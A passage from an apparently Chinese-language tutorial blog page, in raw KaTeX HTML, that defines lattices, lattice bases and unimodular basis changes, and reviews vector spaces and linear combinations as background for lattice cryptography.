cjk_fallback">相</span><span class="mord cjk_fallback">同</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">基</span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">含</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">称</span><span class="mord cjk_fallback">为</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">纬</span><span class="mord cjk_fallback">度</span><span class="mopen">(</span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">m</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">o</span><span class="mord mathnormal">n</span><span class="mclose">)</span><span class="mord">.</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mo stretchy="false">{</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mi>n</mi></msub><msub><mi>v</mi><mi>n</mi></msub><mo>:</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>n</mi></msub><mo>∈</mo><mi>Z</mi><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">L= \lbrace a_1v_1+a_2v_2+...+a_nv_n:a_1,a_2,...,a_n \in Z\rbrace
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">}</span></span></span></span></span></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>n</mi><mtext>维的格</mtext><mi>L</mi><mtext>是</mtext><msup><mi>R</mi><mi>n</mi></msup><mtext>的一个子集且满足：</mtext><mspace width="1em"/><mspace linebreak="newline"></mspace><mtext>（</mtext><mn>1</mn><mtext>）</mtext><mi>L</mi><mtext>是一个加法子群</mtext><mspace width="1em"/><mtext>（</mtext><mn>2</mn><mtext>）</mtext><mi>L</mi><mtext>是离散的【</mtext><mi>L</mi><mtext>的邻域中不包含其他的点】</mtext></mrow><annotation encoding="application/x-tex">n维的格L是R^n的一个子集且满足：\quad \\（1）L是一个加法子群 \quad （2）L是离散的【L的邻域中不包含其他的点】
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mord cjk_fallback">维</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">格</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord cjk_fallback">：</span><span class="mspace" style="margin-right:1em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">（</span><span class="mord">1</span><span class="mord cjk_fallback">）</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">群</span><span class="mspace" style="margin-right:1em;"></span><span class="mord cjk_fallback">（</span><span class="mord">2</span><span class="mord cjk_fallback">）</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">离</span><span class="mord cjk_fallback">散</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">【</span><span class="mord mathnormal">L</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">邻</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">含</span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">他</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">】</span></span></span></span></span></p>
<h2 id="格的基"><a class="anchor" href="#格的基">#</a> 格的基</h2>
<p>格就是从 R^m 中选择 n 个线性无关的向量，选取这些向量的全部整数组合构成的点集。（基向量的任意线性组合的集合）</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>L</mi><mo>=</mo><mi>L</mi><mo stretchy="false">(</mo><mi>B</mi><mo stretchy="false">)</mo><mo>:</mo><mo>=</mo><mi>B</mi><mo>⋅</mo><msup><mi>Z</mi><mi>k</mi></msup><mo>=</mo><mrow><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>0</mn></mrow><mi>k</mi></munderover><msub><mi>z</mi><mi>i</mi></msub><msub><mi>b</mi><mi>i</mi></msub><mo>:</mo><msub><mi>z</mi><mi>i</mi></msub><mtext>​</mtext><mo>∈</mo><mi>Z</mi></mrow></mrow><annotation encoding="application/x-tex">L=L(B):=B⋅Z^k={\sum _{i=0}^{k}z_ib_i:z_i​∈Z}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.05017em;">B</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">⋅</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.1137820000000005em;vertical-align:-1.277669em;"></span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8361130000000003em;"><span style="top:-1.872331em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3000050000000005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.277669em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">​</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span></span></span></p>
<p>这组生成格的线性无关的向量就是格的基，格可以有很多组基，但格的维数是相同的。</p>
<p>格的两组基之间可以通过一个行列式为 ±1 的矩阵进行转换，其基变换矩阵中的元素均为整数【格的基向量不是唯一的】</p>
<p>・这 k 个向量是格 L 的一组基</p>
<p>・格 L 的秩为 k</p>
<p>・格 L 的位数为 m</p>
<p>如果 m=n，那么我们称这个格式满秩的</p>
<p><img data-src="https://s3.bmp.ovh/imgs/2022/03/31/0362e7c30a95862b.png" alt="" /></p>
<p>从上图中可以看出这个二维的格中有两组基， v1' 和 v2' 的明显正交性更好（接近于正交），这样的基我们认为是优质基，反之 v 1 和 v 2 之间夹角就比较小，这类基，通常认为是劣质基。</p>
<p>在此补充一下线性代数相关的内容，因为 Lattice 涉及到很多行列式、基有关。</p>
<h2 id="线性空间"><a class="anchor" href="#线性空间">#</a> 线性空间</h2>
<p><strong>线性空间 (vector spaces)</strong></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>一个线性空间</mtext><mi>V</mi><mtext>，是</mtext><msup><mi>R</mi><mi>m</mi></msup><mtext>的一个子集，满足</mtext><msub><mi>a</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>∈</mo><mi>V</mi><mspace width="1em"/><mi mathvariant="normal">∀</mi><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo>∈</mo><mi>V</mi><mo separator="true">,</mo><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>a</mi><mn>2</mn></msub><mo>∈</mo><mi>R</mi><mspace width="1em"/><mspace linebreak="newline"></mspace><mtext>也就是说，一个线性空间，是对向量加法、标量乘法封闭的</mtext><msup><mi>R</mi><mi>m</mi></msup><mtext>的子集。</mtext></mrow><annotation encoding="application/x-tex">一个线性空间 V，是R^m
的一个子集，满足
a_1v_1+a_2v_2 \in V \quad \forall v_1,v_2 \in V,a_1,a_2 \in R \quad
\\也就是说，一个线性空间，是对向量加法、标量乘法封闭的R^m
的子集。
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8643919999999999em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">间</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">满</span><span class="mord cjk_fallback">足</span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:1em;"></span><span class="mord">∀</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:1em;"></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.7143919999999999em;vertical-align:0em;"></span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">说</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">空</span><span class="mord cjk_fallback">间</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">向</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">加</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">、</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">量</span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">法</span><span class="mord cjk_fallback">封</span><span class="mord cjk_fallback">闭</span><span class="mord cjk_fallback">的</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">m</span></span></span></span></span></span></span></span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">子</span><span class="mord cjk_fallback">集</span><span class="mord cjk_fallback">。</span></span></span></span></span></p>
<p><strong>线性组合 (linear combinations)</strong></p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>v</mi><mn>2</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>v</mi><mi>k</mi></msub><mo>∈</mo><mi>V</mi><mtext>的一个线性组合是满足以下形式的向量：</mtext><mspace linebreak="newline"></mspace><mo stretchy="false">{</mo><mi>w</mi><mo>=</mo><msub><mi>a</mi><mn>1</mn></msub><msub><mi>v</mi><mn>1</mn></msub><mo>+</mo><msub><mi>a</mi><mn>2</mn></msub><msub><mi>v</mi><mn>2</mn></msub><mo>+</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><msub><mi>a</mi><mi>k</mi></msub><msub><mi>v</mi><mi>k</mi></msub><mo separator="true">,</mo><mspace width="1em"/><msub><mi>a</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msub><mi>a</mi><mi>k</mi></msub><mo>∈</mo><mi>R</mi><mo stretchy="false">}</mo><mtext>称为</mtext><mo stretchy="false">{</mo><msub><mi>v</mi><mn>1</mn></msub><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><msub><mi>v</mi><mi>k</mi></msub><mo stretchy="false">}</mo><mtext>的张成空间</mtext></mrow><annotation encoding="application/x-tex">v_1,v_2,...,v_k \in V的一个线性组合是满足以下形式的向量：\\\lbrace w=a_1v_1+a_2v_2+...+a_kv_k, \quad a_1,...,a_k \in R \rbrace称为\lbrace  v_1,...v_k \rbrace 的张成空间
